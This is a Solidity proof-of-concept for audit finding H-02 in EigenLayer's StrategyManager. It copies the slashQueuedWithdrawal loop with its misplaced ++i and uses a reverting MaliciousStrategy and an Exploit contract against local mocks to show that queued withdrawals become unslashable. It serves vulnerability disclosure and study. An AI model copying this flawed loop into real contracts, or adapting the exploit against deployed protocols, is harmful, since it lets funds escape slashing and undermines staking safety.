// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    EigenLayer — [H-02] It is impossible to slash queued withdrawals that
    contain a malicious strategy due to a misplacement of the ++i increment
    Finding 20057 (Code4rena 2023-04, reporter: volodya) — HIGH

    Root cause: StrategyManager.slashQueuedWithdrawal has an `indicesToSkip`
    parameter so that a QueuedWithdrawal containing a malicious strategy
    (whose `withdraw` always reverts) can still be slashed by SKIPPING that
    strategy. The loop's `++i` increment is misplaced INSIDE the `else`
    branch, so it only runs on the NON-skipped path. When index `i` is in
    `indicesToSkip`, only `indicesToSkipIndex` advances — `i` stays the same.
    On the next iteration the skip condition is false (indicesToSkipIndex has
    moved on), the `else` branch runs, and the strategy that was supposed to
    be skipped is withdrawn anyway. For a MALICIOUS strategy that reverts on
    withdraw, this makes the whole slash revert — the queued withdrawal can
    NEVER be slashed, defeating the slashing system and letting the adversary
    later complete the withdrawal.

    This is a self-contained reduction. StrategyManager.slashQueuedWithdrawal's
    loop is copied VERBATIM (the misplaced `++i` preserved on its exact line).
    External deps are minimal faithful mocks: a Strategy that transfers its
    underlying 1:1 to the recipient on withdraw, and a MaliciousStrategy whose
    withdraw always reverts.
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Minimal ERC20 used as a strategy's underlying token.
contract MockToken is IERC20 {
    mapping(address => uint256) public override balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external override returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal IStrategy interface (subset used by slashQueuedWithdrawal).
interface IStrategy {
    function withdraw(address depositor, IERC20 token, uint256 amountShares) external;
    function totalShares() external view returns (uint256);
}

/// @notice A benign strategy: holds `token` and, on withdraw, sends
///         `amountShares` of the underlying 1:1 to the recipient (a faithful
///         reduction of StrategyBase.withdraw's share->token payout).
contract Strategy is IStrategy {
    IERC20 public immutable token;
    uint256 public override totalShares;

    constructor(IERC20 _token, uint256 shares) {
        token = _token;
        totalShares = shares;
    }

    function withdraw(address depositor, IERC20 _token, uint256 amountShares) external override {
        // send the appropriate amount of funds to the recipient (1:1 share:token)
        totalShares -= amountShares;
        _token.transfer(depositor, amountShares);
    }
}

/// @notice A malicious strategy whose `withdraw` ALWAYS reverts — exactly the
///         case `indicesToSkip` was designed to let owners skip over.
contract MaliciousStrategy is IStrategy {
    uint256 public override totalShares;

    constructor(uint256 shares) {
        totalShares = shares;
    }

    function withdraw(address, IERC20, uint256) external pure override {
        revert("malicious strategy: withdraw reverts");
    }
}

/// @notice Reduced EigenLayer StrategyManager. slashQueuedWithdrawal's loop is
///         copied VERBATIM from the audited source (the misplaced `++i` kept
///         on its exact line). The withdrawal-root/frozen/reentrancy machinery
///         is elided (irrelevant to the loop bug); the loop body is unchanged.
contract StrategyManager {
    // A distinct sentinel so no real strategy equals it; keeps the
    // beaconChainETH branch faithful without an EigenPod dependency.
    IStrategy public beaconChainETHStrategy = IStrategy(address(0xdEaD));

    struct QueuedWithdrawal {
        IStrategy[] strategies;
        uint256[] shares;
        address depositor;
    }

    function _withdrawBeaconChainETH(address, address, uint256) internal {
        // stub: never reached in this reduction (no strategy == beaconChainETHStrategy)
    }

    function slashQueuedWithdrawal(
        address recipient,
        QueuedWithdrawal calldata queuedWithdrawal,
        IERC20[] calldata tokens,
        uint256[] calldata indicesToSkip
    ) external {
        require(
            tokens.length == queuedWithdrawal.strategies.length,
            "StrategyManager.slashQueuedWithdrawal: input length mismatch"
        );

        // keeps track of the index in the `indicesToSkip` array
        uint256 indicesToSkipIndex = 0;

        uint256 strategiesLength = queuedWithdrawal.strategies.length;
        for (uint256 i = 0; i < strategiesLength;) {
            // check if the index i matches one of the indices specified in the `indicesToSkip` array
            if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i) {
                unchecked {
                    ++indicesToSkipIndex;
                }
            } else {
                if (queuedWithdrawal.strategies[i] == beaconChainETHStrategy) {
                    //withdraw the beaconChainETH to the recipient
                    _withdrawBeaconChainETH(queuedWithdrawal.depositor, recipient, queuedWithdrawal.shares[i]);
                } else {
                    // tell the strategy to send the appropriate amount of funds to the recipient
                    queuedWithdrawal.strategies[i].withdraw(recipient, tokens[i], queuedWithdrawal.shares[i]);
                }
                unchecked {
                    ++i; // @> VULN: increment is INSIDE the else — a skipped index never advances `i`, so the "skip" is ignored and the strategy is withdrawn anyway (or reverts if malicious)
                }
            }
        }
    }
}

/// @notice Orchestrates the two demonstrations (no cheatcodes, one tx):
///   Part 1 — a BENIGN strategy that indicesToSkip=[0] should skip is
///            withdrawn anyway (proves the skip is completely ignored; the
///            misplaced `++i` executes here).
///   Part 2 — a MALICIOUS strategy that indicesToSkip=[0] should skip makes
///            the whole slash REVERT, so the queued withdrawal can never be
///            slashed and its shares escape slashing (liveness / locked funds).
contract Exploit {
    uint256 public constant BENIGN_AMT = 1e18;
    uint256 public constant MALICIOUS_AMT = 5e18;

    address public constant RECIPIENT = address(0x4EC1);

    StrategyManager public manager;
    MockToken public benignToken;
    Strategy public benignStrategy;
    MaliciousStrategy public maliciousStrategy;

    // observable results
    bool public skipWasIgnored; // Part 1: skipped benign strategy was withdrawn anyway
    bool public maliciousSlashReverted; // Part 2: slash of a malicious-strategy queue reverted

    address public attacker;

    constructor() {
        attacker = msg.sender;
        manager = new StrategyManager();

        // Part 1 setup: a benign strategy pre-funded with its underlying.
        benignToken = new MockToken();
        benignStrategy = new Strategy(benignToken, BENIGN_AMT);
        benignToken.mint(address(benignStrategy), BENIGN_AMT);

        // Part 2 setup: a malicious strategy (withdraw always reverts) holding
        // MALICIOUS_AMT shares that SHOULD have been slashable-by-skipping.
        maliciousStrategy = new MaliciousStrategy(MALICIOUS_AMT);
    }

    function run() external {
        // ============================ PART 1 ============================
        // Queue containing a single BENIGN strategy. The owner wants to skip
        // the only strategy (indicesToSkip = [0]) — so NOTHING should be
        // withdrawn to the recipient.
        IStrategy[] memory strategies1 = new IStrategy[](1);
        strategies1[0] = benignStrategy;
        uint256[] memory shares1 = new uint256[](1);
        shares1[0] = BENIGN_AMT;
        StrategyManager.QueuedWithdrawal memory qw1 = StrategyManager.QueuedWithdrawal({
            strategies: strategies1,
            shares: shares1,
            depositor: address(this)
        });
        IERC20[] memory tokens1 = new IERC20[](1);
        tokens1[0] = benignToken;
        uint256[] memory skip1 = new uint256[](1);
        skip1[0] = 0; // skip the only strategy -> recipient should receive 0

        uint256 recipientBefore = benignToken.balanceOf(RECIPIENT);
        manager.slashQueuedWithdrawal(RECIPIENT, qw1, tokens1, skip1);
        uint256 recipientAfter = benignToken.balanceOf(RECIPIENT);

        // HARM (mechanism): indicesToSkip was completely ignored — the benign
        // strategy that should have been SKIPPED was withdrawn to the recipient.
        skipWasIgnored = (recipientAfter - recipientBefore == BENIGN_AMT);
        require(skipWasIgnored, "indicesToSkip NOT ignored - bug absent");

        // ============================ PART 2 ============================
        // Queue containing a single MALICIOUS strategy. The owner correctly
        // names it in indicesToSkip = [0] so the slash of the OTHER (none here)
        // strategies can proceed while the malicious one is skipped. Because
        // the skip is ignored, malicious.withdraw() is called and reverts.
        IStrategy[] memory strategies2 = new IStrategy[](1);
        strategies2[0] = maliciousStrategy;
        uint256[] memory shares2 = new uint256[](1);
        shares2[0] = MALICIOUS_AMT;
        StrategyManager.QueuedWithdrawal memory qw2 = StrategyManager.QueuedWithdrawal({
            strategies: strategies2,
            shares: shares2,
            depositor: address(this)
        });
        IERC20[] memory tokens2 = new IERC20[](1);
        tokens2[0] = IERC20(address(0));
        uint256[] memory skip2 = new uint256[](1);
        skip2[0] = 0; // owner intends to skip the malicious strategy

        try manager.slashQueuedWithdrawal(RECIPIENT, qw2, tokens2, skip2) {
            maliciousSlashReverted = false;
        } catch {
            maliciousSlashReverted = true;
        }

        // HARM (consequence): even though the malicious strategy was named in
        // indicesToSkip, the slash reverts — the queued withdrawal can NEVER be
        // slashed. Its MALICIOUS_AMT shares escape slashing (locked/unslashable),
        // and the adversary can later complete the withdrawal.
        require(maliciousSlashReverted, "malicious-strategy slash did NOT revert - bug absent");
        require(
            maliciousStrategy.totalShares() == MALICIOUS_AMT,
            "malicious strategy shares changed - not un-slashable"
        );
    }
}
